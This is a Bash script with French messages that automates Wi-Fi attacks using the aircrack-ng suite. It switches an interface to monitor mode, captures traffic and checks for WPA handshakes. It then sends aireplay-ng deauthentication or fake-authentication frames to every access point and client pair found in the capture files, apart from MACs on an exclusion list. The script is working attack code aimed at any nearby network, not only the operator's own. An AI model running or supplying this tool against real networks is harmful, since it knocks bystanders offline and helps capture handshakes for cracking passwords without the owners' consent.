#!/bin/bash

BASE_DIR="$(dirname "$0")"
CAP_DIR="$BASE_DIR/cap"
OUI_FILE="$BASE_DIR/myinfo/oui.txt"
EXCLUSION_FILE="$BASE_DIR/myinfo/exclusions.txt"
OUTPUT_DIR="$BASE_DIR/results"
NOW=$(date +'%Y%m%d-%H%M%S')

if [[ "$1" =~ ^wlan[0-9]+$ ]]; then
  WLAN_IFACE="$1"
  shift
else
  WLAN_IFACE="${WLAN_IFACE:-wlan1}"
fi

show_help() {
  cat <<EOF

Usage: $0 [interface] [MODE] [OPTIONS]

interface :
  Interface Wi-Fi (ex: wlan0, wlan1). Défaut : $WLAN_IFACE

Modes :

  CAPTURE
    - Capture Wi-Fi avec airodump-ng

  ATTACK [-a deauth|fakeauth|injection] [-o OFFSET|ALL]
    - Lance attaque sur les stations détectées
    - -o OFFSET : utiliser le CSV avant-dernier (2), ou plus ancien (3, 4...)
    - -o ALL : attaquer tous les CSV du dossier

Exemples :

  $0 CAPTURE
  $0 wlan0 CAPTURE
  $0 ATTACK -a deauth
  $0 wlan1 ATTACK -a fakeauth -o 2
  $0 ATTACK -a injection -o ALL

EOF
}

set_monitor_mode() {
  echo "[*] Déconnexion $WLAN_IFACE"
  nmcli device disconnect "$WLAN_IFACE" 2>/dev/null
  ip link set "$WLAN_IFACE" down
  iw "$WLAN_IFACE" set monitor control
  ip link set "$WLAN_IFACE" up
}

set_managed_mode() {
  echo "[*] Remise en mode managed"
  nmcli device set "$WLAN_IFACE" managed yes 2>/dev/null
  ip link set "$WLAN_IFACE" down
  iw "$WLAN_IFACE" set type managed
  ip link set "$WLAN_IFACE" up
}

cleanup() {
  echo
  echo "[*] Interruption reçue → remise en managed..."
  set_managed_mode
  exit 1
}
trap cleanup SIGINT SIGTERM

check_handshake() {
  local last_cap
  last_cap=$(ls -1t "$CAP_DIR"/*.cap 2>/dev/null | head -n1)
  [[ -z "$last_cap" ]] && { echo "[!] Aucun fichier .cap trouvé."; return; }

  echo "[*] Vérification handshake dans : $last_cap"
  aircrack-ng "$last_cap"
}

show_csv() {
  local last_csv
  last_csv=$(ls -1t "$CAP_DIR"/*.csv 2>/dev/null | head -n1)
  [[ -z "$last_csv" ]] && { echo "[!] Aucun fichier CSV trouvé."; return; }
  echo "[*] Dernier CSV : $last_csv"
  echo "---------------------------"
  cat "$last_csv"
  echo "---------------------------"
}

capture_airodump() {
  set_monitor_mode
  echo "[*] Capture sur $WLAN_IFACE"
  airodump-ng "$WLAN_IFACE" --write "$CAP_DIR/sniff-$NOW" --band abg
  set_managed_mode
  check_handshake
  show_csv
}

attack_all() {
  local attack_type="deauth"
  local csv_offset=1

  while [[ $# -gt 0 ]]; do
    case "$1" in
      -a) attack_type="$2"; shift 2;;
      -o) csv_offset="$2"; shift 2;;
      *) echo "[!] Option inconnue $1"; exit 1;;
    esac
  done

  set_monitor_mode

  if [[ "$csv_offset" == "ALL" ]]; then
    mapfile -t all_csvs < <(ls -1t "$CAP_DIR"/*.csv 2>/dev/null)
    [[ ${#all_csvs[@]} -eq 0 ]] && { echo "[!] Aucun CSV"; set_managed_mode; exit 1; }
  else
    mapfile -t all_csvs < <(ls -1t "$CAP_DIR"/*.csv 2>/dev/null | sed -n "${csv_offset}p")
    [[ ${#all_csvs[@]} -eq 0 ]] && { echo "[!] Aucun CSV avec OFFSET=$csv_offset"; set_managed_mode; exit 1; }
  fi

  mapfile -t exclusions < <(grep -E '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' "$EXCLUSION_FILE" 2>/dev/null | tr 'a-f' 'A-F')

  for last_csv in "${all_csvs[@]}"; do
    echo "[*] Traitement CSV : $last_csv"

    filtered_csv="${last_csv%.csv}-filtered.csv"

    awk -F',' -v excl="$(printf "%s\n" "${exclusions[@]}")" '
    BEGIN {
      split(excl, macs, "\n")
      for(i in macs) exclude[macs[i]] = 1
    }
    NR==1 {print; next}
    {
      bssid = toupper($1)
      station = toupper($6)
      skip=0
      for(m in exclude) {
        if(bssid == m || station == m) {skip=1; break}
      }
      if(skip==0) print
    }
    ' "$last_csv" > "$filtered_csv"

    orig_count=$(wc -l < "$last_csv")
    filt_count=$(wc -l < "$filtered_csv")

    if (( filt_count < orig_count )); then
      echo "[*] Fichier filtré créé : $filtered_csv (exclusions appliquées)"
      use_csv="$filtered_csv"
    else
      echo "[*] Pas d'exclusion dans $last_csv, utilisation du fichier original"
      rm -f "$filtered_csv"
      use_csv="$last_csv"
    fi

    awk -F',' '
      NR==1 {
        for (i=1; i<=NF; i++) {
          if ($i == "BSSID") bssid_col = i
          if ($i == "CH") ch_col = i
        }
      }
      NR>1 && $bssid_col ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/ {
        print toupper($bssid_col) " " $ch_col
      }
    ' "$use_csv" > /tmp/bssid_channels.txt

    declare -A bssid_channels=()
    while read -r bssid ch; do
      bssid_channels["$bssid"]="$ch"
    done < /tmp/bssid_channels.txt
    rm -f /tmp/bssid_channels.txt

    mapfile -t pairs < <(
      awk -F',' '/Station MAC/ {stations=1;next} stations && NF>1 && $1 ~ /([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}/ && $6 ~ /([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}/ {
        gsub(/ /,"",$1);gsub(/ /,"",$6);
        print toupper($6)" "toupper($1)
      }' "$use_csv"
    )

    [[ ${#pairs[@]} -eq 0 ]] && { echo "[!] Aucune paire dans $use_csv"; continue; }

    echo "[*] Exclusions: ${#exclusions[@]} MAC(s)"
    echo "[*] Attaque '$attack_type' sur ${#pairs[@]} paire(s) dans $use_csv"

    for pair in "${pairs[@]}"; do
      bssid="${pair%% *}"
      station="${pair##* }"
      channel="${bssid_channels[$bssid]}"
      if [[ -z "$channel" || "$channel" == "-1" ]]; then
        echo "[!] Canal invalide ou absent pour $bssid → skip"
        continue
      fi
      echo "[*] Canal $channel → BSSID $bssid / STATION $station"
      iwconfig "$WLAN_IFACE" channel "$channel"
      case "$attack_type" in
        deauth)
          aireplay-ng --deauth 10 -a "$bssid" -c "$station" "$WLAN_IFACE" --ignore-negative-one
          ;;
        fakeauth)
          aireplay-ng --fakeauth 10 -a "$bssid" -h "$station" "$WLAN_IFACE" --ignore-negative-one
          ;;
        injection)
          aireplay-ng --test "$WLAN_IFACE"
          ;;
        *)
          echo "[!] Type invalide"; set_managed_mode; exit 1;;
      esac
    done
  done

  set_managed_mode
  echo "[*] Attaque(s) terminée(s)"
}

analyse_fichiers() {
  echo "[*] Analyse → pas encore codée"
}

MODE="$1"
shift || true

case "$MODE" in
  CAPTURE)
    capture_airodump ;;
  ATTACK)
    attack_all "$@" ;;
  DONE|NODONE|NORMAL)
    analyse_fichiers ;;
  --help|-h)
    show_help ;;
  *)
    echo "[!] Mode inconnu"; show_help; exit 1 ;;
esac

